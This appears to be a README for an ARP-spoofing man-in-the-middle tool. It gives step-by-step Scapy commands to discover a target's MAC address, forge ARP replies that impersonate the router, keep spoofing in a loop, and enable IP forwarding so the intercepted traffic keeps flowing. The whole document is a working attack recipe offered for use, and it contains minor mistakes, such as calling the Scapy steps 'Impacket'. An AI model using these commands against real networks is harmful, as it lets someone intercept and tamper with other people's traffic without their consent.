# ArpSpoof-MITM-Framework

---------------------------------------------------------Dappt---------------------------------------------------------

Script Usage (attack on a network with 3 machines: router, attacker, target):

        [-] Attacker sends ARP request to broadcast (everyone on LAN) in order to receive a response from someone who knows
            where the target machine is located 
            
            --> This request contains the mac address of broadcast (destination) and the
                IP address of the target machine 
            
            --> The request essentially asks everyone on the network (through the broadcast address) who has {targetIP}? 
                Hopefully a machine on the network who knows the location (MAC address of target machine) will respond with the 
                information we are looking for

        [-] Now that we have the MAC address of the target machine we can use it to craft a malicious packet that will tell
            the target machine that our MAC address is the same as the routers MAC address
            
            --> This will cause every outgoing packets from the target machine will be sent to both the router and the target
                machine
    
    Some useful Scapy commands:

        [-] ls(ARP) --> will list all fields required by an ARP packet
        
        [-] important fields: op, hwsrc,psrc, hwdst, pdst
        
        [-] packet = ARP(pdst='<TARGET IPADDR>') --> set pdst (destination address) to TARGETS IPADDR
        
        [-] packet.show --> show the current state of the packet being crafted
        
        [-] packet.op = 1 --> sending request --> "who has ..."
        
        [-] packet.op = 2 --> sending response

    Methodology: 

        [-] Send arp request through the broadcast MAC address, every machine on the LAN will receive 
            request and possibly send the reply
        
        [-] Impacket (manually):
            
            Getting mac address of target machine w/ spoofed ARP request :
            
                [-] broadcast = Ether(dst='ff:ff:ff:ff:ff:ff') --> Broadcast Address
                
                [-] arp_layer = ARP(pdst='{TARGETIP}')
                
                [-] entire_packet = broadcast/arp_layer --> combines arp_layer and broadcast layer into packet
                
                [-] answer = srp(entire_packet, timeout=2, verbose=True)[0] --> sending request to broadcast
                
                [-] print(answer) --> will show request and response if any received
                
                [-] print(answer[0])
                
                [-] target_mac_address = answer[0][1].hwsrc --> get mac address of target                                                                                                                                                                                                                                                                                  
                
                [-] print(target_mac_address)

            Craftinfg Malicious packet:

                [-] We are essentially going to craft a packet that will tell the target machine that
                    the attacker machine is a router, so it sends all of its packets to the attacker machine
                
                [-] packet = ARP(op=2, hwdst=target_mac_address, pdst='192.168.0.131', psrc='192.168.0.1')
                    
                    --> psrc is address of machine we want to impersonate (router)
                    --> run `netstat -nr` in terminal to find addr of router on your network (gateway)
                
                [-] packet.show() will show the contents of our malicious packet
                
                [-] send(packet, verbose=False) --> sends malicious packet to spoof targets ARP table
            
            Arp-tables on target machine:

                [-] You can run the command `arp -a` on the target machine before sending the malicious packet, 
                    and again after sending the malicious packet to confirm if we successfully spoofed the arp
                    tables on the target machine

[!] Script should be run in a while loop to continuosly spoof the targets arp tables since the target machine will also still 
    send the same ARP requests we are sending still

[!] If the target machine is unable to access the internet after it has been spoofed then you may need to run this command on your 
attacker machine to forward the packets: 

    [-] echo 1 >> /proc/sys/net/ipv4/ip_forward                                                                                                                                                                                                                                                                            



---------------------------------------------------------Dappt---------------------------------------------------------
